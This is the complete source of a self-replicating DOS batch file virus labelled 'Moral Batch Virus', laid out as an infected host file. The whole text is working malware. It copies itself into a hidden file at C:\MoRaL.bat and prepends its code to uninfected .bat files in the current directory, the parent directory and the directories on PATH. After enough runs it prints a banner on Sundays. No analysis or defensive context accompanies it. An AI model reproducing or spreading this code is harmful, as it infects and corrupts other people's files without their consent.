@echo off%_MoRaL%
if '%1=='ViR goto MoRaL%2
if '%!%=='111 goto MoRaLend
if exist C:\MoRaL.bat goto MoRaLrun
if not exist %0.bat goto MoRaLend
echo MoRaL|find "x">nul
if not errorlevel 1 goto MoRaLend
find "MoRaL"<%0.bat>C:\MoRaL.bat
attrib C:\MoRaL.bat +h
:MoRaLrun
command /e:5000 /c C:\MoRaL ViR shl
set !=%!%1%_MoRaL%
goto MoRaLend
:MoRaLshl
C:\MoRaL ViR srh . .. %path%
:MoRaLsrh
shift%_MoRaL%
if '%2==' exit MoRaL
for %%a in (%2\*.bat) do call C:\MoRaL ViR inf %%a
goto MoRaLsrh
:MoRaLinf
find "MoRaL"<%3>nul
if not errorlevel 1 goto MoRaLcnt
type C:\MoRaL.bat>MoRaL.t
type %3>>MoRaL.t
move MoRaL.t %3>nul
set MoRaLi=%MoRaLi%1
if %MoRaLi%==11 exit
:MoRaLcnt
set MoRaLc=%MoRaLc%1
if not %MoRaLc%==111111111111 goto MoRaLend
echo.|date|find "Sun">nul.MoRaL
if errorlevel 1 exit MoRaL
set MoRaL=echo
%MoRaL% -----------------
%MoRaL% Moral Batch Virus
%MoRaL% -----------------
exit MoRaL
:MoRaLend
:: this would be the host